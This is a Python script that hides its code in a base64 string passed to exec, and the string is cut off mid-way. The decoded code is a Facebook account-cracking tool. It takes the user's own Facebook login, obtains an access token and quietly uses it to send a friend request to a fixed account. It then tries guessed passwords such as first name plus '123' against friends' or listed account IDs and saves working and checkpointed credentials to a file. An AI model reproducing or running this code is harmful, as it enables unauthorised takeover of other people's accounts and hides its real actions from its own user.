#ha bo chi hati ??!
from base64 import *
exec(b64decode("IyEvdXNyL2Jpbi9weXRob24yCiNjb2Rpbmc9dXRmLTgKCgppbXBvcnQgb3Msc3lzLHRpbWUsZGF0ZXRpbWUscmFuZG9tLGhhc2hsaWIscmUsdGhyZWFkaW5nLGpzb24sdXJsbGliLGNvb2tpZWxpYixyZXF1ZXN0cyxtZWNoYW5pemUKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbApmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgoKCnJlbG9hZChzeXMpCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkKYnIuc2V0X2hhbmRsZV9yb2JvdHMoRmFsc2UpCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSxtYXhfdGltZT0xKQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldCgoKZGVmIGtlbHVhcigpOgoJcHJpbnQgIlwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbUJhY2siCglvcy5zeXMuZXhpdCgpCgoKZGVmIGFjYWsoYik6CiAgICB3ID0gJ2FodGR6amMnCiAgICBkID0gJycKICAgIGZvciBpIGluIHg6CiAgICAgICAgZCArPSAnIScrd1tyYW5kb20ucmFuZGludCgwLGxlbih3KS0xKV0raQogICAgcmV0dXJuIGNldGFrKGQpCgoKZGVmIGNldGFrKGIpOgogICAgdyA9ICdhaHRkempjJwogICAgZm9yIGkgaW4gdzoKICAgICAgICBqID0gdy5pbmRleChpKQogICAgICAgIHg9IHgucmVwbGFjZSgnISVzJyVpLCdcMDMzWyVzOzFtJyVzdHIoMzEraikpCiAgICB4ICs9ICdcMDMzWzBtJwogICAgeCA9IHgucmVwbGFjZSgnITAnLCdcMDMzWzBtJykKICAgIHN5cy5zdGRvdXQud3JpdGUoeCsnXG4nKQoKCmRlZiBqYWxhbih6KToKCWZvciBlIGluIHogKyAnXG4nOgoJCXN5cy5zdGRvdXQud3JpdGUoZSkKCQlzeXMuc3Rkb3V0LmZsdXNoKCkKCQl0aW1lLnNsZWVwKDAwMDAwLjEpCgoKIyMjIyBMT0dPICMjIyMKbG9nbyA9ICIiIgovICAgPDk2OHBvbGxhPgogIFwgICAgICAgIDx3ZWxjb21lPiAgCgrilojiloDilojigIPilojiloDilojigIPilojilpHilpHigIPilojilpHilpHigIPiloTiloDilogK4paI4paA4paA4oCD4paI4paE4paI4oCD4paI4paE4paE4oCD4paI4paE4paE4oCD4paI4paA4paIICAgICAgICAgICAgICAgICAgICAgICAgICAgIApNZTogcG9sbDFhCnRlbGdyYW06IHBvbGwyYQpncm91cDogcG9sbDNhCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiIiIgoKZGVmIHRpaygpOgoJdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICddCglmb3IgbyBpbiB0aXRpazoKCQlwcmludCgiXHJcMDMzWzE7OTZtW+KXj10gXHgxYlsxOzkzbUxvZ2dpbmcgSW4gXHgxYlsxOzk3bSIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpCgoKYmFjayA9IDAKYmVyaGFzaWwgPSBbXQpjZWtwb2ludCA9IFtdCm9rcyA9IFtdCmlkID0gW10KbGlzdGdydXAgPSBbXQp2dWxub3QgPSAiXDAzM1szMW1FZXJvciIKdnVsbiA9ICJcMDMzWzMybUVlcm9yIgoKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50ICItLS0tLS0tLS0tcG9sbGEtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS13ZWxjb21lLS0tLS0tLS0tLS0tIgpwcmludCAgIiIiCuKWiOKWgOKWiOKAg+KWiOKWgOKWiOKAg+KWiOKWkeKWkeKAg+KWiOKWkeKWkeKAg+KWhOKWgOKWiArilojiloDiloDigIPilojiloTilojigIPilojiloTiloTigIPilojiloTiloTigIPilojiloDiloggICAgICAgICAgICAgICAgCgoKTWU6IHBvbGwxYQoKdGVsZ3JhbTogcG9sbDJhCgpncm91cDogcG9sbDNhIiIiCgpwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgoKVXNlcm5hbWUgPSAiUG9sbDFhIgpQYXNzd29yZCA9ICIgICAxMjE2IgoKbG9vcCA9ICd0cnVlJwp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bXHgxYlsxOzkzbeKYhlx4MWJbMTs5Nm1dIFx4MWJbMTszMW1Vc2VybmFtZVx4MWJbMTs5M20+XHgxYlsxOzk2bT5ceDFiWzE7OTNtPlx4MWJbMTs5Nm0+XDAzM1sxOzM1OzQwbSAiKQogICAgaWYgKHVzZXJuYW1lID09IFVzZXJuYW1lKToKICAgIAlwYXNzd29yZCA9IHJhd19pbnB1dCgiXDAzM1sxOzk2bVtceDFiWzE7OTNt4piGXHgxYlsxOzk2bV0gXHgxYlsxOzMxbVBhc3N3b3JkXHgxYlsxOzkzbT5ceDFiWzE7OTZtPlx4MWJbMTs5M20+XHgxYlsxOzk2bT5cMDMzWzE7MzU7NDBtICIpCiAgICAgICAgaWYgKHBhc3N3b3JkID09IFBhc3N3b3JkKToKICAgICAgICAgICAgcHJpbnQgIm9rIOKchSIgKyB1c2VybmFtZQogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50ICJFZXJvciIKICAgICAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3QubWUvcG9sbDFhJykKICAgIGVsc2U6CiAgICAgICAgcHJpbnQgIkVlcm9yIgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly90Lm1lL3BvbGwyYScpCgpkZWYgbG9naW4oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpCgkJbWVudSgpIAoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJcHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJCXByaW50KCdcMDMzWzE7OTZtW+KYhl0gXHgxYlsxOzkxbUFERCBuZXcgRmFjZWJvb2sgXHgxYlsxOzk2bVvimIZdJyApCgkJaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5Nm1bK10gXHgxYlswOzM0bUlEL0VtYWlsIFx4MWJbMTs5MW06IFx4MWJbMTs5Mm0nKQoJCXB3ZCA9IHJhd19pbnB1dCgnXDAzM1sxOzk2bVsrXSBceDFiWzA7MzRtUGFzc3dvcmQgXHgxYlsxOzkxbTogXHgxYlsxOzkybScpCgkJdGlrKCkKCQl0cnk6CgkJCWJyLm9wZW4oJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20nKQoJCWV4Y2VwdCBtZWNoYW5pemUuVVJMRXJyb3I6CgkJCXByaW50IlxuXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtRWVyb3IiCgkJCWtlbHVhcigpCgkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKCQlici5zZWxlY3RfZm9ybShucj0wKQoJCWJyLmZvcm1bJ2VtYWlsJ10gPSBpZAoJCWJyLmZvcm1bJ3Bhc3MnXSA9IHB3ZAoJCWJyLnN1Ym1pdCgpCgkJdXJsID0gYnIuZ2V0dXJsKCkKCQlpZiAnc2F2ZS1kZXZpY2UnIGluIHVybDoKCQkJdHJ5OgoJCQkJc2lnPSAnYXBpX2tleT04ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZGNyZWRlbnRpYWxzX3R5cGU9cGFzc3dvcmRlbWFpbD0nK2lkKydmb3JtYXQ9SlNPTmdlbmVyYXRlX21hY2hpbmVfaWQ9MWdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xbG9jYWxlPWVuX1VTbWV0aG9kPWF1dGgubG9naW5wYXNzd29yZD0nK3B3ZCsncmV0dXJuX3NzbF9yZXNvdXJjZXM9MHY9MS4wNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCgkJCQlkYXRhID0geyJhcGlfa2V5IjoiODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGQiLCJjcmVkZW50aWFsc190eXBlIjoicGFzc3dvcmQiLCJlbWFpbCI6aWQsImZvcm1hdCI6IkpTT04iLCAiZ2VuZXJhdGVfbWFjaGluZV9pZCI6IjEiLCJnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMiOiIxIiwibG9jYWxlIjoiZW5fVVMiLCJtZXRob2QiOiJhdXRoLmxvZ2luIiwicGFzc3dvcmQiOnB3ZCwicmV0dXJuX3NzbF9yZXNvdXJjZXMiOiIwIiwidiI6IjEuMCJ9CgkJCQl4PWhhc2hsaWIubmV3KCJtZDUiKQoJCQkJeC51cGRhdGUoc2lnKQoJCQkJYT14LmhleGRpZ2VzdCgpCgkJCQlkYXRhLnVwZGF0ZSh7J3NpZyc6YX0pCgkJCQl1cmwgPSAiaHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL3Jlc3RzZXJ2ZXIucGhwIgoJCQkJcj1yZXF1ZXN0cy5nZXQodXJsLHBhcmFtcz1kYXRhKQoJCQkJej1qc29uLmxvYWRzKHIudGV4dCkKCQkJCXVuaWtlcnMgPSBvcGVuKCJsb2dpbi50eHQiLCAndycpCgkJCQl1bmlrZXJzLndyaXRlKHpbJ2FjY2Vzc190b2tlbiddKQoJCQkJdW5pa2Vycy5jbG9zZSgpCgkJCQlwcmludCAnXG5ceDFiWzE7MzY7NDBtT2suLi4nCgkJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vdC5tZS9wb2xsMmEnKQoJCQkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9tZXRob2Q9cG9zdCZ1aWRzPWd3aW11c2EzJmFjY2Vzc190b2tlbj0nK3pbJ2FjY2Vzc190b2tlbiddKQoJCQkJbWVudSgpCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJCXByaW50IlxuXHgxYlsxOzkxbVshXWludGVybmV0IgoJCQkJa2VsdWFyKCkKCQlpZiAnY2hlY2twb2ludCcgaW4gdXJsOgoJCQlwcmludCgiXG5ceDFiWzE7OTJtWyFdQ2hlY2twb2ludCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJa2VsdWFyKCkKCQllbHNlOgoJCQlwcmludCgiXG5ceDFiWzE7OTNtRWVyb3IiKQoJCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCQl0aW1lLnNsZWVwKDEpCgkJCWxvZ2luKCkKCgpkZWYgbWVudSgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQiXHgxYlsxOzkxbVshXVRva2VuIFhYWCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkKCQluYW1hID0gYVsnbmFtZSddCgkJaWQgPSBhWydpZCddCgkJb3RzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQoJCWIgPSBqc29uLmxvYWRzKG90cy50ZXh0KQoJCXN1YiA9IHN0cihiWydzdW1tYXJ5J11bJ3RvdGFsX2NvdW50J10pCglleGNlcHQgS2V5RXJyb3I6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQiXDAzM1sxOzkxbVshXUNoZWNrcG9pbnQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50Ilx4MWJbMTs5Mm0oISlpbnRlcm5ldCIKCQlrZWx1YXIoKQoJb3Muc3lzdGVtKCJjbGVhciIpCglwcmludCBsb2dvCglwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKCXByaW50ICJbIV1OYW1lOiAiK25hbWErIi8iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoJcHJpbnQgIlshXSBJRDogIitpZCsiLyIKCXByaW50ICJbIV0gU3ViczogIitzdWIrIi8iCglwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKCXByaW50ICJcMDMzWzE7MzI7NDBtWzFdIFwwMzNbMTszMzs0MG08MT5IYWNraW5nIgkKCXByaW50ICJcMDMzWzE7MzI7NDBtWzJdIFwwMzNbMTszMzs0MG08Mj51cGRhdGluZyIJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkKCXByaW50ICJcMDMzWzE7MzI7NDBtWzBdIFwwMzNbMTszMzs0MG08Mz4gbG9nIG91dCBBY2NvdW50IgoJcGlsaWgoKQoKZGVmIHBpbGloKCk6Cgl1bmlrZXJzID0gcmF3X2lucHV0KCJcblwwMzNbMTszMTs0MG0+Pj4gXDAzM1sxOzM1OzQwbSIpCglpZiB1bmlrZXJzID09IiI6CgkJcHJpbnQgIlx4MWJbMTs5MW1FZXJvciIKCQlwaWxpaCgpCgllbGlmIHVuaWtlcnMgPT0iMSI6CgkJc3VwZXIoKQoJZWxpZiB1bmlrZXJzID09IjIiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgoJCW9zLnN5c3RlbSgnZ2l0IHB1bGwgb3JpZ2luIG1hc3RlcicpCgkJcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKCQltZW51KCkKCWVsaWYgdW5pa2VycyA9PSIwIjoKCQlqYWxhbignT2snKQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJa2VsdWFyKCkKCWVsc2U6CgkJcHJpbnQgIlx4MWJbMTs5MW1FZXJvciIKCQlwaWxpaCgpCgpkZWYgc3VwZXIoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXHgxYlsxOzkxbUVlcm9yIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlx4MWJbMTszMjs0MG1bMV0gXDAzM1sxOzMzOzQwbTwxPEZyaWVuZCIKCXByaW50ICJceDFiWzE7MzI7NDBtWzJdIFwwMzNbMTszMzs0MG08Mj5JRCBHbG9iYWxsIgoJcHJpbnQgIlx4MWJbMTszMjs0MG1bM10gXDAzM1sxOzMzOzQwbTwzPldvcmRsaXN0IgoJcHJpbnQgIlx4MWJbMTszMjs0MG1bNF0gXDAzM1sxOzMzOzQwbTw0PkZpbGUiCglwcmludCAiXHgxYlsxOzMyOzQwbVswXSBcMDMzWzE7MzM7NDBtPDU+QmFjayIKCXBpbGloX3N1cGVyKCkKCmRlZiBwaWxpaF9zdXBlcigpOgoJcGVhayA9IHJhd19pbnB1dCgiXG5cMDMzWzE7MzE7NDBtPj4+IFwwMzNbMTszNTs0MG0iKQoJaWYgcGVhayA9PSIiOgoJCXByaW50ICJceDFiWzE7OTFtRWVyb3IiCgkJcGlsaWhfc3VwZXIoKQoJZWxpZiBwZWFrID09IjEiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCgkJamFsYW4oJ1wwMzNbMTs5M21b4py6XSB3YWl0Li4uIFwwMzNbMTs5N20uLi4nKQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQoJCWZvciBzIGluIHpbJ2RhdGEnXToKCQkJaWQuYXBwZW5kKHNbJ2lkJ10pCgoJZWxpZiBwZWFrID09IjIiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bUF0gSUQ6ICIpCgkJdHJ5OgoJCQlqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCW9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzMxOzQwbVtQXSBOYW1lIDogIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJceDFiWzE7OTJtW1BdIElEIEVlcm9yISIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk0bUJhY2tcMDMzWzE7OTZtXSIpCgkJCXN1cGVyKCkKCQlwcmludCJcMDMzWzE7MzU7NDBtW1BdIHdhaXQuLi4iCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIi9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgaSBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChpWydpZCddKQoJZWxpZiBwZWFrID09IjMiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlicnV0ZSgpCQoJZWxpZiBwZWFrID09IjQiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28gICAgICAgICAgICAgICAgICAKCQl0cnk6CgkJCWlkbGlzdCA9IHJhd19pbnB1dCgnXHgxYlsxOzk2bVsrXSBceDFiWzE7OTNtPDwvPj48PC8+Pjw8Lz4+IFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQoJCQlmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwncicpLnJlYWRsaW5lcygpOgoJCQkJaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkKCQlleGNlcHQgSU9FcnJvcjoKCQkJcHJpbnQgJ1x4MWJbMTszNTs0MG1bIV0gXHgxYlsxOzM1OzQwbUVlcm9yJwoJCQlyYXdfaW5wdXQoJ1xuXHgxYlsxOzM1OzQwbVsgXHgxYlsxOzM1OzQwbUJhY2sgXHgxYlsxOzM1OzQwbV0nKQoJCQlzdXBlcigpCgllbGlmIHBlYWsgPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJceDFiWzE7OTFtRWVyb3IiCgkJcGlsaWhfc3VwZXIoKQoKCQoJcHJpbnQgIlwwMzNbMTszNjs0MG1bUF0gdG90YWwgSUQgOiBcMDMzWzE7OTRtIitzdHIobGVuKGlkKSkKCWphbGFuKCdcMDMzWzE7MzQ7NDBtW1BdIHBseiB3YWl0IC4uLicpCgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTszMjs0MG1bUF0gTG9hZGluZy4uLlwwMzNbMTs5M20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoJcHJpbnQgIi4iCglwcmludCAiLiIKCglqYWxhbignICAgICAgICAgIFwwMzNbMTs5MW1Mb2FkaW5nLi4uLi4xMG1pbi4xNW1pbi5vay4uLi4nKQoJcHJpbnQgICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iIAoKCWRlZiBtYWluKGFyZyk6CgkJZ2xvYmFsIGNla3BvaW50LG9rcwoJCXVzZXIgPSBhcmcKCQl0cnk6CgkJCW9zLm1rZGlyKCdvdXQnKQoJCWV4Y2VwdCBPU0Vycm9yOgoJCQlwYXNzIAogICAgICAgIHRyeToKICAgICAgICAgICAgYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHVzZXIgKyAnLz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBiID0ganNvbi5sb2FkcyhhLnRleHQpCiAgICAgICAgICAgIHBhc3MxID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMycKICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczEgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1cblx4ZTJceDk1XHg5NFtWZXJ5IEdPT0RdIFx4MWJbMTs5Mm0gJyArICdcblx4ZTJceDk1XHg5MUlEOiAnICsgdXNlciArICdcblx4ZTJceDk1XHg5MVBBU1M6ICcgKyBwYXNzMSArICdcblx4ZTJceDk1XHg5YU5BVzogJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyICsgcGFzczEpCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTszNjs0MG1cblx4ZTJceDk1XHg5NFtTb3JyeSBDSEVDS1BPSU5UXScgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczEgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oJ291dC9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBjZWsud3JpdGUodXNlciArICd8JyArIHBhc3MxICsgJ1xuJykKICAgICAgICAgICAgICAgIGNlay5jbG9zZSgpCiAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3MxKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcGFzczIgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTIzNDUnCiAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMiArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTJtXHhlMlx4OTVceDk0W1ZlcnkgR09PRF0nICsgJ1xuXHhlMlx4OTVceDkxSUQ6ICcgKyB1c2VyICsgJyBcblx4ZTJceDk1XHg5MVBBU1M6ICAnICsgcGFzczIgKyAnXG5OQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIgKyBwYXNzMikKICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTszNjs0MG1ceGUyXHg5NVx4OTRbU29ycnkgQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xuXHhlMlx4OTVceDkxSUQ6ICcgKyB1c2VyICsgJ1xuXHhlMlx4OTVceDkxUEFTUzogJyArIHBhc3MyICsgJ1xuXHhlMlx4OTVceDlhTkFXJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oJ291dC9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXIgKyAnfCcgKyBwYXNzMiArICdcbicpCiAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3MyKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwYXNzMyA9IGJbJ2ZpcnN0X25hbWUnXSArICcxMjM0JwogICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3MzICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTs5Mm1ceGUyXHg5NVx4OTRbVmVyeSBHT09EXSBceDFiWzE7OTJtICcgKyAnXG5ceGUyXHg5NVx4OTFJRDogJyArIHVzZXIgKyAnXG5ceGUyXHg5NVx4OTFQQVNTOiAnICsgcGFzczMgKyAnXG5ceGUyXHg5NVx4OWFOQVc6ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyICsgcGFzczMpCiAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTszNjs0MG1ceGUyXHg5NVx4OTRbU29ycnkgQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xuXHhlMlx4OTVceDkxSUQ6ICc